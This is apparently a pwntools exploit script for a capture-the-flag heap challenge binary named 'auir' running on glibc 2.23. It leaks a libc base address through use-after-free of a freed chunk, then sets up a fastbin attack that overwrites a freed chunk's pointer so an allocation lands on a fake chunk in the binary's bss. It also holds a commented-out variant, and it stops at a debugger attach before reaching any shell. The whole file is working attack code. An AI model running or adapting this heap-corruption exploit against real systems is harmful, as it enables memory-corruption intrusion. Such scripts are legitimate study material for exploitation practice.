#!/usr/bin/env python3

from pwn import *

exe = ELF("./auir")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    MAKE = "1"
    DESTROY = "2"
    EDIT = "3"
    DISPLAY = "4"
    EXIT = "5"

    bss = 0x605310

    # Leak libc address (main_arena)

    r.sendline(MAKE) # idx 0
    r.sendline("256") # size
    r.sendline("A" * 256)

    r.sendline(MAKE) # idx 1
    r.sendline("256") # size
    r.sendline("B" * 256)

    r.sendline(DESTROY)
    r.sendline("0") # index

    r.sendline(DISPLAY)
    r.sendline("0")

    r.recvuntil("[*]SHOWING....\n")
    leak = u64(r.recvn(8))
    libc.address = leak - 0x3c4b78
    log.info("libc base: {}".format(hex(libc.address)))
    
    # fastbin attack -> fake chunk at 0x605310

    r.sendline(MAKE) # idx 2
    r.sendline("32") # size
    r.sendline("A" * 32)

    r.sendline(MAKE) # idx 3
    r.sendline("32") # size
    r.sendline("A" * 32)

    r.sendline(DESTROY)
    r.sendline("2") #idx

    r.sendline(DESTROY)
    r.sendline("3") #idx

    r.sendline(EDIT)
    r.sendline("3") #idx
    r.sendline("8") # size
    r.sendline(p64(bss - 0x20))
    '''
    r.sendline(MAKE) # idx 4
    r.sendline("32") # size
    r.sendline("A" * 32)

    r.sendline(DESTROY)
    r.sendline("2") #idx

    r.sendline(DESTROY)
    r.sendline("3") #idx

    r.sendline(DESTROY)
    r.sendline("4") #idx

    r.sendline(EDIT)
    r.sendline("2") #idx
    r.sendline("56") # size
    r.sendline("\x00" * 8 + "A" * 32 + p64(0x31) + p64(bss - 0x10))
    
    r.sendline(MAKE)
    r.sendline("32")
    r.sendline(p64(bss - 0x10) + "\x00" * 24)
	'''
    gdb.attach(r)

    r.interactive()


if __name__ == "__main__":
    main()
